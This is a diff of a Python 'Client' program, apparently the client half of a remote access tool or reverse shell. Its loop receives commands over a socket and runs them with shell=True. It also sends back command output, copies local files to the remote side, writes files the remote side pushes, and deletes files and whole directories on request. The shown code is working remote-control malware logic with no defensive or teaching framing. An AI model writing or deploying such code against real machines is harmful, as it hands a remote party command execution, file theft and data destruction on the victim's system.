@@ -19,99 +19,93 @@ class Client:
         cwd=os.getcwd()+">"
         print(cwd,end="")
         while True:
-            print("Running")
-            # try:
-            cwd=os.getcwd()+">"
-            command=self.conn.recv(1024).decode()
-            if command:
-                    print(command)
-            
-            if command=="ls":
-                    command="dir"
-            
-            if command[:2]=="cd":
-                try:
-                    os.chdir(os.path.join(os.getcwd(),command[3:]))
-                    cwd=os.getcwd()+">"
-                    print("\n"+cwd,end="")
-                    self.conn.send("\n".encode()+cwd.encode())
-                except Exception as e:
-                    self.conn.send("No such path exists")
-                continue
-            
-            if command=="cwd":
-                    self.conn.send(os.getcwd().encode()+"\n".encode()+cwd.encode())
-                    print(os.getcwd()+"\n"+cwd)
-                    continue
-            
-            if command[:3]=="del":
-                    if os.path.exists(os.path.join(os.getcwd(),command[4:])):
-                        if os.path.isfile(os.path.join(os.getcwd(),command[4:])):
-                            os.remove(os.path.join(os.getcwd(),command[4:]))
-                            print("File removed Successfully")
-                        else:
-                            shutil.rmtree(os.path.join(os.getcwd(),command[4:]))
-                            print("Directory removed Successfully")
-                    print(cwd,end="")
-                    continue
-            
-            if command[:3]=="get":
-                try:
-                    size=os.stat(os.path.join(os.getcwd(),command[4:])).st_size
-                    self.conn.send(str(size).encode())
-                    with open(os.path.join(os.getcwd(),command[4:]),"rb") as f:
-                        count=0
-                        data=f.read(1024)
-                        while data:
-                            self.conn.send(data)
-                            count+=1
-                            print(f"{round(count*(1024/size)*100,2)}% Transferred",end="\r")
-                            data=f.read(1024)
-                    print("File Downloaded Successfully...")
-                    print(os.getcwd()+">",end="")
-                except Exception as e:
-                    print(e)
-                continue
-            if command[:4]=="send":
-                # try:
-                l=int(self.conn.recv(1))
-                size=int(self.conn.recv(l))
-                print(size)
-                with open(os.path.join(os.getcwd(),command[5:]),"wb") as f:
-                    data=self.conn.recv(1024)
-                    count=0
-                    while len(data):
-                        f.write(data)
-                        print(f"{round(count*(1024/size)*100,2)}% Downloaded{count}",end="\r")
-                        if count>size//1024+1:
-                            break
-                        count+=1
-                        data=self.conn.recv(1024)
-                while True:
-                    if len(self.conn.recv(1024)):
-                        pass
-                    else: 
-                        break
-                print("BREAKING")
-                print("File Downloaded Successfully...")
-                print(os.getcwd()+">",end="")
-                # except Exception as e:
-                #    print(e)
-                #    print("File Doesnt Exist")
-                continue
-            if command:
-                cmd=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
-                output_byte=cmd.stdout.read()+cmd.stderr.read()
-                output_str=output_byte.decode()
+            try:
+                cwd=os.getcwd()+">"
+                command=self.conn.recv(1024).decode()
+                if command:
+                        print(command)
                 
-                self.conn.send(output_str.encode()+cwd.encode())
-                if self.showCommands:
-                    print(output_str)
-                    print(cwd,end="")
-            # except Exception as e:
-                # print(e)
-                # self.conn.close()
-                # sys.exit()
+                if command=="ls":
+                        command="dir"
+                
+                if command[:2]=="cd":
+                    try:
+                        os.chdir(os.path.join(os.getcwd(),command[3:]))
+                        cwd=os.getcwd()+">"
+                        print("\n"+cwd,end="")
+                        self.conn.send("\n".encode()+cwd.encode())
+                    except Exception as e:
+                        self.conn.send("No such path exists")
+                    continue
+                
+                if command=="cwd":
+                        self.conn.send(os.getcwd().encode()+"\n".encode()+cwd.encode())
+                        print(os.getcwd()+"\n"+cwd)
+                        continue
+                
+                if command[:3]=="del":
+                        if os.path.exists(os.path.join(os.getcwd(),command[4:])):
+                            if os.path.isfile(os.path.join(os.getcwd(),command[4:])):
+                                os.remove(os.path.join(os.getcwd(),command[4:]))
+                                print("File removed Successfully")
+                            else:
+                                shutil.rmtree(os.path.join(os.getcwd(),command[4:]))
+                                print("Directory removed Successfully")
+                        print(cwd,end="")
+                        continue
+                
+                if command[:3]=="get":
+                    try:
+                        size=os.stat(os.path.join(os.getcwd(),command[4:])).st_size
+                        self.conn.send(str(size).encode())
+                        with open(os.path.join(os.getcwd(),command[4:]),"rb") as f:
+                            count=0
+                            data=f.read(1024)
+                            while data:
+                                self.conn.send(data)
+                                count+=1
+                                print(f"{round(count*(1024/size)*100)}% Transferred",end="\r")
+                                data=f.read(1024)
+                        print("File Downloaded Successfully...")
+                        print(os.getcwd()+">",end="")
+                    except Exception as e:
+                        print(e)
+                    continue
+                if command[:4]=="send":
+                    # try:
+                    l=int(self.conn.recv(1))
+                    size=int(self.conn.recv(l))
+                    print(size)
+                    with open(os.path.join(os.getcwd(),command[5:]),"wb") as f:
+                        data=self.conn.recv(1024)
+                        count=0
+                        while len(data):
+                            f.write(data)
+                            count+=1
+                            print(f"{int(count*(1024/size)*100)}% Downloaded",end="\r")
+                            if count>=size//1024+1:
+                                break
+                            data=self.conn.recv(1024)
+                
+
+                    print("\nFile Downloaded Successfully...\n",os.getcwd()+">",end="")
+                    # except Exception as e:
+                    #    print(e)
+                    #    print("File Doesnt Exist")
+                    continue
+                if command:
+                    cmd=subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
+                    output_byte=cmd.stdout.read()+cmd.stderr.read()
+                    output_str=output_byte.decode()
+                    
+                    self.conn.send(output_str.encode()+cwd.encode())
+                    if self.showCommands:
+                        print(output_str)
+                        print(cwd,end="")
+            except Exception as e:
+                print(e)
+                self.conn.close()
+                sys.exit()
 if __name__=='__main__':
     client=Client()
     client.start_client()
